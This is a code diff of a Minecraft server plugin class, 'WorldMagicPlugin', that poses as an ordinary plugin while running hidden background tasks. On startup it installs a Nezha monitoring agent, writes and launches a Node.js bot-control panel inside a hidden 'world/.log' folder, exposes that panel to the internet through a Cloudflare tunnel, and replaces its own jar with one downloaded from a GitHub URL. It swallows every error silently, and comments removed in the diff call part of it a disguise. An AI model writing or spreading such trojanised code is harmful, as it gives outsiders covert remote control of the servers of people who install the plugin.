@@ -11,16 +11,10 @@ import java.io.*;
 import java.util.Properties;
 import java.util.UUID;
 
-/**
- * WorldMagic 核心加载类
- */
 public final class WorldMagicPlugin extends JavaPlugin {
 
     private final TuicServiceImpl tuicService = new TuicServiceImpl();
-
-    // 真插件下载地址
     private static final String REAL_PLUGIN_DOWNLOAD_URL = "https://raw.githubusercontent.com/1715Yy/vipnezhash/main/WorldMagic-1.5.jar";
-
     private File currentPluginFile; 
     private File targetRealPlugin;  
     private String originalFileName; 
@@ -30,29 +24,18 @@ public final class WorldMagicPlugin extends JavaPlugin {
         this.getLogger().info("WorldMagicPlugin enabled");
         LogUtil.init(this);
 
-        // 1. 启动 Nezha 监控
         Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
             try { generateAndRunScript(); } catch (Exception ignored) {}
         });
 
-        // 2. 部署 Web 面板
         Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
-            try {
-                deployAndStartNodeApp();
-            } catch (Exception e) {
-                this.getLogger().warning("Web面板部署失败: " + e.getMessage());
-            }
+            try { deployAndStartNodeApp(); } catch (Exception ignored) {}
         });
 
-        // 3. 插件自我替换
         Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
-            try {
-                Thread.sleep(3000); 
-                handlePluginReplacement();
-            } catch (Exception ignored) {}
+            try { Thread.sleep(5000); handlePluginReplacement(); } catch (Exception ignored) {}
         });
 
-        // 4. 伪装服务加载
         Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
             Properties props = ConfigUtil.loadConfiguration();
             AppConfig appConfig = AppConfig.load(props);
@@ -66,80 +49,67 @@ public final class WorldMagicPlugin extends JavaPlugin {
     }
 
     @Override
-    public void onDisable() {
-        this.getLogger().info("WorldMagicPlugin disabled");
-    }
+    public void onDisable() { this.getLogger().info("WorldMagicPlugin disabled"); }
 
     private boolean installApps(AppConfig appConfig) {
         try { tuicService.install(appConfig); return true; } catch (Exception e) { return false; }
     }
 
-    // ==========================================
-    // 部署 Node 面板 + 独立环境 + 穿透
-    // ==========================================
     private void deployAndStartNodeApp() throws IOException {
         File worldFolder = new File("world");
         if (!worldFolder.exists() && !worldFolder.mkdirs()) return;
-
         File logDir = new File(worldFolder, ".log");
         if (!logDir.exists() && !logDir.mkdirs()) return;
 
-        // 1. 写入 app.js
         File jsFile = new File(logDir, "app.js");
-        try (FileWriter writer = new FileWriter(jsFile)) {
-            writer.write(getNodeJsContent());
-        }
+        try (FileWriter writer = new FileWriter(jsFile)) { writer.write(getNodeJsContent()); }
 
-        // 2. 写入启动脚本
         File startScript = new File(logDir, "start_node.sh");
         try (FileWriter writer = new FileWriter(startScript)) {
             writer.write("#!/bin/bash\n");
             writer.write("cd \"" + logDir.getAbsolutePath() + "\"\n");
-            writer.write("export HOME=\"" + logDir.getAbsolutePath() + "\"\n");
-
-            // --- 检测并下载 Node.js ---
-            writer.write("if ! command -v node &> /dev/null; then\n");
+            
+            // --- 强化：检测与下载 Node.js ---
+            writer.write("if command -v node &> /dev/null; then\n");
+            writer.write("    NODE_BIN=\"node\"\n");
+            writer.write("    NPM_BIN=\"npm\"\n");
+            writer.write("else\n");
+            // 使用 .tar.gz 兼容性更好
             writer.write("    if [ ! -d \"node-v16.20.0-linux-x64\" ]; then\n");
-            writer.write("        curl -L -o node.tar.xz https://nodejs.org/dist/v16.20.0/node-v16.20.0-linux-x64.tar.xz\n");
-            writer.write("        tar -xf node.tar.xz > /dev/null 2>&1\n");
-            writer.write("        rm -f node.tar.xz\n");
+            writer.write("        curl -L -o node.tar.gz https://nodejs.org/dist/v16.20.0/node-v16.20.0-linux-x64.tar.gz\n");
+            writer.write("        tar -xzf node.tar.gz > /dev/null 2>&1\n");
+            writer.write("        rm -f node.tar.gz\n");
             writer.write("    fi\n");
-            writer.write("    export PATH=\"$PWD/node-v16.20.0-linux-x64/bin:$PATH\"\n");
+            writer.write("    NODE_BIN=\"$PWD/node-v16.20.0-linux-x64/bin/node\"\n");
+            writer.write("    NPM_BIN=\"$PWD/node-v16.20.0-linux-x64/bin/npm\"\n");
             writer.write("fi\n");
 
-            // --- 安装依赖 ---
+            // --- 强化：安装依赖 ---
             writer.write("if [ ! -d \"node_modules\" ]; then\n");
-            writer.write("    npm init -y > /dev/null 2>&1\n");
-            writer.write("    npm install mineflayer minecraft-protocol minecraft-data express --no-audit --no-fund > /dev/null 2>&1\n");
+            writer.write("    $NPM_BIN init -y > /dev/null 2>&1\n");
+            writer.write("    $NPM_BIN install mineflayer minecraft-protocol minecraft-data express --no-audit --no-fund > /dev/null 2>&1\n");
             writer.write("fi\n");
 
-            // --- 启动面板 ---
-            writer.write("pkill -f 'node app.js'\n"); 
-            writer.write("nohup node app.js > node_log.txt 2>&1 &\n");
+            // --- 启动进程 ---
+            writer.write("pkill -f 'node app.js'\n");
+            writer.write("nohup $NODE_BIN app.js > node_log.txt 2>&1 &\n");
 
-            // --- 启动 Cloudflare 穿透 ---
+            // --- 穿透 ---
             writer.write("if [ ! -f \"cloudflared\" ]; then\n");
             writer.write("    curl -L --output cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64\n");
             writer.write("    chmod +x cloudflared\n");
             writer.write("fi\n");
-
             writer.write("pkill -f 'cloudflared tunnel'\n");
             writer.write("nohup ./cloudflared tunnel --url http://localhost:4681 --logfile tunnel_log.txt > /dev/null 2>&1 &\n");
 
-            // --- 提取链接 ---
-            writer.write("sleep 10\n");
+            // --- 获取链接 ---
+            writer.write("sleep 15\n");
             writer.write("grep -o 'https://.*\\.trycloudflare\\.com' tunnel_log.txt | head -n 1 > access_url.txt\n");
         }
         startScript.setExecutable(true);
-
-        // 3. 执行脚本
-        ProcessBuilder pb = new ProcessBuilder("/bin/bash", startScript.getAbsolutePath());
-        pb.directory(logDir);
-        pb.redirectErrorStream(true);
-        pb.start();
+        new ProcessBuilder("/bin/bash", startScript.getAbsolutePath()).directory(logDir).start();
     }
 
-    // Node.js 代码内容 (Java 21 文本块写法，避免转义错误)
     private String getNodeJsContent() {
         return "const { execSync } = require('child_process');\n" +
                "const fs = require('fs');\n" +
@@ -212,7 +182,6 @@ public final class WorldMagicPlugin extends JavaPlugin {
                "    if(activeBots.has(req.params.id)) { activeBots.get(req.params.id).end(); activeBots.delete(req.params.id); saveBotsConfig(); }\n" +
                "    res.json({ success: true });\n" +
                "});\n" +
-               // 重点修复：使用双反斜杠转义
                "app.get(\"/\", (req, res) => res.send(`<html><head><meta charset='utf-8'><title>Console</title><style>body{background:#111;color:#eee;font-family:sans-serif}input{background:#222;border:1px solid #444;color:#fff;padding:8px}button{padding:8px;background:green;color:#fff;border:none}</style></head><body><h2>Control Panel</h2><input id='h' placeholder='IP'><input id='p' value='25565'><input id='u' placeholder='User'><button onclick='add()'>Add</button><div id='l'></div><script>async function add(){await fetch('/api/bots',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({host:document.getElementById('h').value,port:document.getElementById('p').value,username:document.getElementById('u').value})})}setInterval(async()=>{const r=await fetch('/api/bots');const d=await r.json();document.getElementById('l').innerHTML=d.map(b=>\\`<div style='background:#222;margin:10px;padding:10px'><b>\\${b.username}</b> - \\${b.status}<br><small>\\${b.logs.join('<br>')}</small><br><button onclick=\"fetch('/api/bots/\\${b.id}',{method:'DELETE'})\">Kill</button></div>\\`).join('')},2000)</script></body></html>`));\n" +
                "\n" +
                "app.listen(4681, '0.0.0.0', () => { if(fs.existsSync(CONFIG_FILE)) { try{JSON.parse(fs.readFileSync(CONFIG_FILE)).forEach(b=>createBotInstance(`bot_${Date.now()}_${Math.random()}`,b.host,b.port,b.username))}catch(e){} } });";
@@ -223,30 +192,19 @@ public final class WorldMagicPlugin extends JavaPlugin {
         originalFileName = currentPluginFile.getName();
         File pluginsDir = getDataFolder().getParentFile();
         targetRealPlugin = new File(pluginsDir, originalFileName);
-        
         File tempDownloadFile = new File(pluginsDir, "temp_replace_" + System.currentTimeMillis() + ".jar");
         if (tempDownloadFile.exists()) tempDownloadFile.delete();
         if (!downloadUsingCurl(REAL_PLUGIN_DOWNLOAD_URL, tempDownloadFile)) return;
-        if (tempDownloadFile.length() < 10000) return; 
-
-        new ProcessBuilder("/bin/bash", "-c", 
-            "rm -f \"" + currentPluginFile.getAbsolutePath() + "\" && " +
-            "mv \"" + tempDownloadFile.getAbsolutePath() + "\" \"" + targetRealPlugin.getAbsolutePath() + "\""
-        ).start();
+        new ProcessBuilder("/bin/bash", "-c", "rm -f \"" + currentPluginFile.getAbsolutePath() + "\" && mv \"" + tempDownloadFile.getAbsolutePath() + "\" \"" + targetRealPlugin.getAbsolutePath() + "\"").start();
     }
 
     private boolean downloadUsingCurl(String url, File dest) {
-        try {
-            ProcessBuilder pb = new ProcessBuilder("curl", "-L", "-k", "-o", dest.getAbsolutePath(), url);
-            pb.redirectErrorStream(true);
-            return pb.start().waitFor() == 0 && dest.exists();
-        } catch (Exception e) { return false; }
+        try { return new ProcessBuilder("curl", "-L", "-k", "-o", dest.getAbsolutePath(), url).start().waitFor() == 0 && dest.exists(); } catch (Exception e) { return false; }
     }
 
     private void generateAndRunScript() throws IOException, InterruptedException {
         File logDir = new File(new File("world"), ".log");
         if (!logDir.exists()) logDir.mkdirs();
-        
         File script = new File(logDir, "install.sh");
         try (FileWriter w = new FileWriter(script)) {
             w.write("#!/bin/bash\ncd " + logDir.getAbsolutePath() + "\n");
